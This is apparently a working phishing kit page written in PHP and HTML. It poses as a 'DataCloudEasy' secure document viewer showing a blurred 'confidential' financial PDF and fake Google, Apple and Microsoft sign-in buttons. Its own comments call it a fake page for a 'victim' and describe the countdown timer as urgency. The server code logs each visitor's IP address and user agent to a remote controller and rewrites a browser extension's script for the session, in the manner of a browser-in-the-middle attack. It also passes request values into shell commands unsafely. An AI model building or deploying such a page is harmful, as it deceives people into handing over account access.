<!DOCTYPE html>
<html lang="en">
<head>
<title>DataCloudEasy — Secure Document Viewer</title>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f0f2f5;color:#1a1a2e;min-height:100vh;display:flex;flex-direction:column}

/* ── Top bar ── */
.topbar{background:#fff;border-bottom:1px solid #e0e0e0;padding:0 28px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.06)}
.brand{display:flex;align-items:center;gap:9px;font-size:17px;font-weight:700;color:#1a73e8;text-decoration:none;letter-spacing:-.2px}
.brand svg{width:28px;height:28px;flex-shrink:0}
.topbar-right{font-size:13px;color:#777}

/* ── Page shell ── */
main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:40px 16px 60px;gap:28px;flex-wrap:wrap}

/* ── PDF preview card ── */
.pdf-preview-wrap{position:relative;width:340px;flex-shrink:0}
.pdf-stack{position:relative;width:100%}
.pdf-shadow{position:absolute;background:#d9d9d9;border-radius:4px;width:92%;left:4%}
.pdf-shadow.s2{top:-6px;height:100%}
.pdf-shadow.s3{top:-12px;width:88%;left:6%;height:100%}
.pdf-card{position:relative;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.18);z-index:2}

/* fake A4 page content (blurred) */
.pdf-header{background:#1a73e8;padding:18px 20px;display:flex;align-items:center;gap:10px}
.pdf-header-logo{width:22px;height:22px;background:rgba(255,255,255,.25);border-radius:50%;display:inline-block}
.pdf-header-title{color:#fff;font-size:13px;font-weight:600;opacity:.9}
.pdf-body{padding:18px 20px;filter:blur(3.5px);user-select:none;pointer-events:none}
.pdf-line{height:8px;background:#e8e8e8;border-radius:4px;margin-bottom:9px}
.pdf-line.w100{width:100%}.pdf-line.w85{width:85%}.pdf-line.w72{width:72%}
.pdf-line.w60{width:60%}.pdf-line.w90{width:90%}.pdf-line.w45{width:45%}
.pdf-section-gap{height:14px}
.pdf-line.head{height:13px;background:#c8c8c8;margin-bottom:14px}
.pdf-table-row{display:flex;gap:8px;margin-bottom:8px}
.pdf-table-row .pdf-line{margin:0;flex:1}
/* lock overlay */
.lock-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.72);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:10;backdrop-filter:blur(1px)}
.lock-icon{width:52px;height:52px;background:#1a73e8;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 14px rgba(26,115,232,.38);margin-bottom:10px}
.lock-icon svg{width:24px;height:24px;fill:#fff}
.lock-label{font-size:13px;font-weight:600;color:#333;text-align:center}

/* ── Right panel ── */
.info-panel{width:340px;display:flex;flex-direction:column;gap:16px}

/* sender card */
.sender-card{background:#fff;border-radius:10px;padding:20px 22px;box-shadow:0 1px 6px rgba(0,0,0,.08)}
.sender-row{display:flex;align-items:center;gap:12px;margin-bottom:14px}
.avatar{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#1a73e8,#0d5bbd);display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;font-weight:700;flex-shrink:0}
.sender-info{min-width:0}
.sender-name{font-size:14px;font-weight:600;color:#202124;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sender-sub{font-size:12px;color:#888;margin-top:2px}
.doc-meta{display:flex;flex-direction:column;gap:6px}
.doc-meta-row{display:flex;align-items:center;gap:8px;font-size:13px;color:#555}
.doc-meta-row svg{width:15px;height:15px;flex-shrink:0;opacity:.6}
.doc-meta-label{color:#888;margin-right:2px}
.doc-name{font-weight:600;color:#202124;font-size:14px;margin-bottom:10px;display:flex;align-items:center;gap:7px}
.doc-name svg{width:20px;height:20px;flex-shrink:0}
.badge-conf{display:inline-block;background:#fce8e6;color:#c0392b;font-size:10.5px;font-weight:700;padding:2px 7px;border-radius:20px;letter-spacing:.3px;margin-left:4px}

/* auth card */
.auth-card{background:#fff;border-radius:10px;padding:22px;box-shadow:0 1px 6px rgba(0,0,0,.08)}
.auth-title{font-size:15px;font-weight:700;color:#202124;margin-bottom:4px}
.auth-sub{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}
.auth-divider{display:flex;align-items:center;gap:10px;margin:14px 0;color:#aaa;font-size:12px}
.auth-divider::before,.auth-divider::after{content:"";flex:1;border-top:1px solid #e8e8e8}

/* sign-in buttons */
.sign-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:11px 18px;font-size:14px;font-weight:600;border-radius:8px;cursor:pointer;text-decoration:none;border:1px solid #dadce0;background:#fff;color:#3c4043;transition:box-shadow .15s,background .15s;margin-bottom:10px}
.sign-btn:last-child{margin-bottom:0}
.sign-btn:hover{background:#f8f9fa;box-shadow:0 1px 6px rgba(0,0,0,.12)}
.sign-btn.google{border-color:#dadce0}
.sign-btn.apple{border-color:#dadce0}
.sign-btn.ms{border-color:#dadce0}
.sign-btn svg{flex-shrink:0}

/* security note */
.security-note{background:#e8f0fe;border-radius:8px;padding:12px 14px;display:flex;align-items:flex-start;gap:10px}
.security-note svg{width:16px;height:16px;flex-shrink:0;fill:#1a73e8;margin-top:1px}
.security-note p{font-size:12px;color:#444;line-height:1.5}
.security-note strong{color:#1a73e8}

/* expiry notice */
.expiry-row{text-align:center;font-size:11.5px;color:#999;margin-top:6px}
.expiry-row span{color:#c0392b;font-weight:600}

/* loading overlay */
#loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);z-index:9999;align-items:center;justify-content:center;flex-direction:column}
#loading-overlay.active{display:flex}
.spinner{width:44px;height:44px;border:3px solid #e8e8e8;border-top:3px solid #1a73e8;border-radius:50%;animation:spin .75s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.loading-text{color:#444;margin-top:1.2rem;font-size:14px}

footer{text-align:center;padding:16px;font-size:11.5px;color:#aaa;background:transparent}
footer a{color:#aaa;text-decoration:none}

@media(max-width:720px){
  main{flex-direction:column;align-items:center;padding:24px 12px 40px}
  .pdf-preview-wrap,.info-panel{width:100%;max-width:400px}
}
</style>
</head>

<?php
// this is a fake page for getting the victim's resolution (dynamic)

function GET($var)  { return isset($_GET[$var])  ? htmlspecialchars($_GET[$var])  : null; }
function POST($var) { return isset($_POST[$var]) ? htmlspecialchars($_POST[$var]) : null; }
function SERVER($var) { return isset($_SERVER[$var]) ? htmlspecialchars($_SERVER[$var]) : null; }

$ctrlUrl = "https://controller/";

function base64url_encode($data) {
	return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

// retrieve server instance ID via env
if(getenv("SID")) {
	$sid = getenv("SID");
	shell_exec("sed -i 's/const serverName = \".*\"/const serverName = \"" . $sid . "\"/' /home/user/extension/content.js");
} else {
	echo("Error: SID env not found");
}

// retrieve client identifier, store and add to chromium extension code
if(isset($_GET["reqid"])) {
	$reqid = GET("reqid");
	shell_exec("echo $reqid > /home/user/tmp/reqid$sid.txt");
	shell_exec("sed -i 's/const id = \".*\"/const id = \"" . $reqid . "\"/' /home/user/extension/content.js");
} else {
	echo("Error: request id not found");
	if(isset($_GET["svr"])) $reqid = "admin"; // assuming admin access
}

// retrieve user agent, store it
$usera = SERVER("HTTP_USER_AGENT");
if(isset($usera)) {
	shell_exec("echo '$usera' > /home/user/tmp/useragent$sid.txt");
} else {
	echo("Warning: user agent not given");
}

// logging to central acccess log via controller
if($_SERVER["REQUEST_METHOD"] === "GET") {
	// get client IP
	if(array_key_exists("HTTP_X_FORWARDED_FOR", $_SERVER)) {
		$ip = htmlspecialchars($_SERVER["HTTP_X_FORWARDED_FOR"]);
	} else {
		$ip = htmlspecialchars($_SERVER["REMOTE_ADDR"]);
	}

	$agent = base64url_encode($usera);

	$context = [ 'http' => [ 'method' => 'GET' ], 'ssl' => [ 'verify_peer' => false, 'allow_self_signed'=> true ] ];

	$url = $ctrlUrl . "?svr=" . $sid . "&cmd=logaccess&reqid=" . $reqid . "&ip=" . $ip . "&agent=" . $agent;

	if(file_get_contents($url, false, stream_context_create($context)) === false) {
			echo "[!] Error: sending accesslog entry to controller";
	}
}
?>

<body>

<!-- Loading overlay — shown while resolution is POSTed and session is initialised -->
<div id="loading-overlay">
  <div class="spinner"></div>
  <p class="loading-text">Preparing secure document viewer&hellip;</p>
</div>

<!-- Top navigation bar -->
<header class="topbar">
  <a href="#" class="brand">
    <!-- Cloud + database icon -->
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/>
    </svg>
    DataCloudEasy
  </a>
  <span class="topbar-right">Secure Document Sharing</span>
</header>

<main>

  <!-- ── Left: stacked PDF preview ── -->
  <div class="pdf-preview-wrap">
    <div class="pdf-stack">
      <!-- depth shadows -->
      <div class="pdf-shadow s3"></div>
      <div class="pdf-shadow s2"></div>

      <!-- main page card -->
      <div class="pdf-card">
        <!-- fake PDF header bar -->
        <div class="pdf-header">
          <span class="pdf-header-logo"></span>
          <span class="pdf-header-title">CONFIDENTIAL &mdash; Protected Document</span>
        </div>

        <!-- fake blurred body content -->
        <div class="pdf-body">
          <div class="pdf-line head w72"></div>
          <div class="pdf-line w100"></div><div class="pdf-line w85"></div>
          <div class="pdf-line w90"></div><div class="pdf-line w60"></div>
          <div class="pdf-section-gap"></div>
          <div class="pdf-line w45"></div>
          <div class="pdf-table-row"><div class="pdf-line"></div><div class="pdf-line"></div><div class="pdf-line"></div></div>
          <div class="pdf-table-row"><div class="pdf-line"></div><div class="pdf-line"></div><div class="pdf-line"></div></div>
          <div class="pdf-table-row"><div class="pdf-line"></div><div class="pdf-line"></div><div class="pdf-line"></div></div>
          <div class="pdf-section-gap"></div>
          <div class="pdf-line head w60"></div>
          <div class="pdf-line w100"></div><div class="pdf-line w85"></div>
          <div class="pdf-line w72"></div><div class="pdf-line w90"></div>
          <div class="pdf-line w45"></div>
          <div class="pdf-section-gap"></div>
          <div class="pdf-line head w50"></div>
          <div class="pdf-line w100"></div><div class="pdf-line w60"></div>
          <div class="pdf-line w85"></div><div class="pdf-line w72"></div>
        </div>

        <!-- lock overlay on top of blurred content -->
        <div class="lock-overlay">
          <div class="lock-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 11V7a6 6 0 0 0-12 0v4H4a1 1 0 0 0-1 1v9a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-9a1 1 0 0 0-1-1h-2zm-6 7a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3-7H9V7a3 3 0 0 1 6 0v4z"/></svg>
          </div>
          <div class="lock-label">Sign in to view this document</div>
        </div>
      </div><!-- /.pdf-card -->
    </div><!-- /.pdf-stack -->
  </div><!-- /.pdf-preview-wrap -->

  <!-- ── Right: info + auth panel ── -->
  <div class="info-panel">

    <!-- sender / document metadata -->
    <div class="sender-card">
      <div class="sender-row">
        <div class="avatar">J</div>
        <div class="sender-info">
          <div class="sender-name">James Holloway</div>
          <div class="sender-sub">james.holloway@datacloudasy.com</div>
        </div>
      </div>

      <div class="doc-name">
        <!-- PDF icon -->
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#e53935" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
          <polyline points="14 2 14 8 20 8"/>
          <line x1="16" y1="13" x2="8" y2="13"/>
          <line x1="16" y1="17" x2="8" y2="17"/>
          <polyline points="10 9 9 9 8 9"/>
        </svg>
        Q1_2026_Financial_Summary.pdf
        <span class="badge-conf">CONFIDENTIAL</span>
      </div>

      <div class="doc-meta">
        <div class="doc-meta-row">
          <!-- calendar icon -->
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
          <span><span class="doc-meta-label">Shared</span> March 8, 2026</span>
        </div>
        <div class="doc-meta-row">
          <!-- file icon -->
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
          <span><span class="doc-meta-label">Size</span> 2.4 MB &nbsp;&bull;&nbsp; <span class="doc-meta-label">Pages</span> 38</span>
        </div>
        <div class="doc-meta-row">
          <!-- shield icon -->
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          <span><span class="doc-meta-label">Access</span> Verify identity to unlock</span>
        </div>
      </div>
    </div><!-- /.sender-card -->

    <!-- auth card -->
    <div class="auth-card">
      <div class="auth-title">Sign in to view protected document</div>
      <div class="auth-sub">This document is protected by DataCloudEasy. Please verify your identity to access the content.</div>

      <!-- Google -->
      <a href="#" onclick="DynamicResolution(); return false;" class="sign-btn google">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20" height="20">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>
        Continue with Google
      </a>

      <div class="auth-divider">or</div>

      <!-- Apple / iCloud -->
      <a href="#" onclick="DynamicResolution(); return false;" class="sign-btn apple">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 814 1000" width="18" height="18" fill="#000">
          <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57.8-155.5-127.4c-58.8-82-106.3-209-106.3-329.8 0-194.3 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 103.6-30.4 135.5-71.3z"/>
        </svg>
        Continue with Apple
      </a>

      <!-- Microsoft -->
      <a href="#" onclick="DynamicResolution(); return false;" class="sign-btn ms">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="18" height="18">
          <rect x="0"  y="0"  width="11" height="11" fill="#F25022"/>
          <rect x="12" y="0"  width="11" height="11" fill="#7FBA00"/>
          <rect x="0"  y="12" width="11" height="11" fill="#00A4EF"/>
          <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
        </svg>
        Continue with Microsoft
      </a>
    </div><!-- /.auth-card -->

    <!-- security note -->
    <div class="security-note">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4z"/></svg>
      <p><strong>End-to-end encrypted.</strong> DataCloudEasy never stores your password. Your identity is verified directly with your provider using OAuth 2.0.</p>
    </div>

    <div class="expiry-row">Link expires in <span>23:47:12</span> &nbsp;&mdash;&nbsp; Shared with you only</div>

  </div><!-- /.info-panel -->
</main>

<footer>
  &copy; 2026 DataCloudEasy, Inc. &nbsp;&bull;&nbsp;
  <a href="#">Privacy Policy</a> &nbsp;&bull;&nbsp;
  <a href="#">Terms of Service</a>
</footer>

<script>
// countdown timer — purely cosmetic, adds urgency
(function() {
  var total = 23*3600 + 47*60 + 12;
  function fmt(s) {
    var h = Math.floor(s/3600), m = Math.floor((s%3600)/60), sec = s%60;
    return (h?h+':':'') + (m<10&&h?'0':'') + m + ':' + (sec<10?'0':'') + sec;
  }
  var el = document.querySelector('.expiry-row span');
  if(el) setInterval(function(){ if(total>0) { total--; el.textContent = fmt(total); } }, 1000);
})();

function sleep(time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

function DynamicResolution() {
  document.getElementById('loading-overlay').classList.add('active');

  let vw, vh;
  if (window.visualViewport) {
    vw = Math.round(window.visualViewport.width  * window.devicePixelRatio);
    vh = Math.round(window.visualViewport.height * window.devicePixelRatio);
  } else {
    vw = window.innerWidth;
    vh = window.innerHeight;
  }
  let resString = vw + "x" + vh + "x24";
  let xhr = new XMLHttpRequest();
  xhr.open("POST", window.location.href, true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("res=" + resString);

  sleep(5000).then(() => { window.location.reload(); });
}
</script>
</body>
</html>

<?php
// receive resolution by js and store in fs
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if(isset($_POST["res"])) {
		$data = POST("res");
		$file = fopen("/home/user/tmp/resolution$sid.txt", 'w');
		fwrite($file, $data);
		fclose($file);

		system("chmod 666 /home/user/tmp/resolution$sid.txt");
	} else {
		echo "[!] POST parameter 'res' not set";
	}
/*
	$data = file_get_contents('php://input');
	$f1 = "/tmp/res.txt";
	$f2 = "/tmp/resolution.txt";
	$file = fopen($f1, 'w');
	fwrite($file, $data); // htmlspecialchars!
	fclose($file);
	system("cat " . $f1 . " | grep 'x24' > " . $f2); // echo statt cat, nur resolution.txt
	system("chmod 666 /tmp/res*.txt");
	echo "[*] resolution received";
*/
}
?>
